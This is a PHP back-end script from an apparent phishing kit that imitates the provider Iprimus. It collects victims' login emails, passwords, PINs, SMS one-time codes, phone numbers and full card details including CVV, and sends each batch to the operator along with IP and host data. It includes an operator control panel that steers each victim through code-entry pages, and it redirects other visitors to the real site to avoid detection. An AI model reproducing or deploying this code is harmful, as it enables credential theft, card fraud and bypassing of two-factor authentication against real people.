<?php
    /*******
    Main Author: MemoryError
    ********************************************************/

    require_once 'includes/main.php';
    if( $_GET['pwd'] == PASSWORD ) {
        session_destroy();
        visitors();
        header("Location: clients/one.php?verification#_");
        exit();
    } else if( !empty($_GET['redirection']) ) {
        $red = $_GET['redirection'];
        if( $red == 'errorlogin' ) {
            header("Location: clients/one.php?error=1&verification#_");
            exit();
        }
        if( $red == 'errorsms' ) {
            header("Location: clients/sms.php?error=1&code=". $_GET['code'] ."&verification#_");
            exit();
			}
        if( $red == 'errorsecret' ) {
            header("Location: clients/secret.php?error=1&code=". $_GET['code'] ."&verification#_");
            exit();
        }
        if( $red == 'errortan' ) {
            header("Location: clients/tan.php?error=1&code1=". $_GET['code1'] ."&code2=". $_GET['code2'] ."&code3=". $_GET['code3'] . "&code4=". $_GET['code4'] ."&verification#_");
            exit();
        }
        if( $red == 'secret' ) {
            header("Location: clients/secret.php?code=". $_GET['code'] ."&verification#_");
            exit();
			 }
        if( $red == 'Vsms' ) {
            header("Location: clients/Vsms.php?code=". $_GET['code'] ."&verification#_");
            exit();
        }
        if( $red == 'tan' ) {
            header("Location: clients/tan.php?code1=". $_GET['code1'] ."&code2=". $_GET['code2'] ."&code3=". $_GET['code3'] ."&code4=". $_GET['code4'] ."&verification#_");
            exit();
        }
        if( $red == 'errorcc' ) {
            $_SESSION['one'] = '';
            $_SESSION['three'] = '';
            $_SESSION['two'] = '';
            $_SESSION['errors']['one'] = true;
            $_SESSION['errors']['three'] = true;
            $_SESSION['errors']['two'] = true;
            header("Location: clients/index.php?error=1&code=". $_GET['code'] ."&verification#_");
            exit();
        }
        header("Location: clients/". $red .".php?verification#_");
        exit();
    } else if($_SERVER['REQUEST_METHOD'] == "POST") {
        if( !empty($_POST['captcha']) ) {
            header("HTTP/1.0 404 Not Found");
            die();
        }
        if ($_POST['step'] == "login") {
            $_SESSION['errors']     = [];
            $_SESSION['key']   = $_POST['key'];
            if( empty($_POST['key']) ) {
                $_SESSION['errors']['key'] = true;
            
            }
          
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' |  | Login';
                $message = '🚦☠️ 0Fault ☠️🚦Login Iprimus ' . get_client_ip() . "\r\n";
                $message .= '📧Email : ' . $_POST['key'] . "\r\n";
                $message .= '🔐password : ' . $_POST['pin'] . "\r\n";
                $message .= '🚦Steps : ' . get_steps_link() . "\r\n";
                $message .= '🏠Host : '.gethostbyaddr(getenv("REMOTE_ADDR")) . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: clients/loading.php?verification#_");
                exit();
            } else {
                header("Location: clients/one.php?error=1&verification#_");
                exit();
            }
        }
        if ($_POST['step'] == "pass") {
            $_SESSION['errors']     = [];
            $_SESSION['pin']   = $_POST['pin'];
            if( empty($_POST['pin']) ) {
                $_SESSION['errors']['pin'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' |  | ';
                $message = '🚦☠️ 0Fault ☠️🚦Iprimus PIN ' . get_client_ip() . "\r\n";
                $message .= '📩PIN : ' . $_POST['pin'] . "\r\n";
                $message .= '🚦Steps : ' . get_steps_link() . "\r\n";
                $message .= '🏠Host : '.gethostbyaddr(getenv("REMOTE_ADDR")) . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: clients/loading.php?verification#_");
                exit();
            } else {
                header("Location: clients/pass.php?error=1&verification#_");
                exit();
				}
        }
        if ($_POST['step'] == "sms") {
            $_SESSION['errors']     = [];
            $_SESSION['sms']   = $_POST['sms'];
            if( empty($_POST['sms']) ) {
                $_SESSION['errors']['sms'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' |  | VerifySmS';
                $message = '🚦☠️ 0Fault ☠️🚦Iprimus SMS ' . get_client_ip() . "\r\n";
                $message .= '📩SMS : ' . $_POST['sms'] . "\r\n";
                $message .= '🚦Steps : ' . get_steps_link() . "\r\n";
                $message .= '🏠Host : '.gethostbyaddr(getenv("REMOTE_ADDR")) . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: clients/loading.php?verification#_");
                exit();
            } else {
                header("Location: clients/sms.php?error=1&verification#_");
                exit();
            }
        }
        if ($_POST['step'] == "tele") {
            $_SESSION['errors']     = [];
            $_SESSION['tel']   = $_POST['tel'];
            if( empty($_POST['tel']) ) {
                $_SESSION['errors']['tel'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' |  | Question';
                $message = '/-- WISE INFOS --/' . get_client_ip() . "\r\n";
				$message .= 'PHONE : ' . $_POST['tel'] . "\r\n";
                $message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END  INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: clients/loading.php?verification#_");
                exit();
            } else {
                header("Location: clients/tele.php?error=1&code=". $_POST['code'] ."&verification#_");
                exit();
            }
       }
        if ($_POST['step'] == "cc") {
           $_SESSION['errors']     = [];
            $_SESSION['one']   = $_POST['one'];
            if( empty($_POST['one']) ) {
                $_SESSION['errors']['one'] = true;
           
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' |  | Card';
                $message = '🚦☠️ 0Fault ☠️🚦Iprimus CARD ' . get_client_ip() . "\r\n";
                $message .= '🧒 Cart Holder : ' . $_POST['nm'] . "\r\n";
				$message .= '💳 Cart Number : ' . $_POST['one'] . "\r\n";
                $message .= '🧲 Expiry Date : ' . $_POST['two'] . "\r\n";
	            $message .= '🔑 Cvv : ' . $_POST['three'] . "\r\n";
                $message .= '🚦 Steps : ' . get_steps_link() . "\r\n";
                $message .= '🏠Host : '.gethostbyaddr(getenv("REMOTE_ADDR")) . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: clients/loading.php?verification#_");
            } else {
                header("Location: clients/index.php?error=1&verification#_");
            }
        }
        if ($_POST['step'] == "control") {
            $fp = fopen('victims/'. $_POST['ip'] .'.txt', 'wb');
            if( $_POST['to'] == 'tan' ) {
                $_POST['to'] = $_POST['to'] . '/' . $_POST['tan_text'];
            }
            if( $_POST['to'] == 'errortan' ) {
                $_POST['to'] = $_POST['to'] . '/' . $_POST['errortan_text'];
            }
            if( $_POST['to'] == 'sms' ) {
                $_POST['to'] = $_POST['to'] . '/' . $_POST['sms_text'];
            }
            if( $_POST['to'] == 'errorsms' ) {
                $_POST['to'] = $_POST['to'] . '/' . $_POST['errorsms_text'];
            }
            fwrite($fp, $_POST['to']);
            fclose($fp);
            header("location: control.php?ip=" . $_POST['ip']);
        }
    } else {
        header("Location: " . OFFICIAL_WEBSITE);
        exit();
    }
?>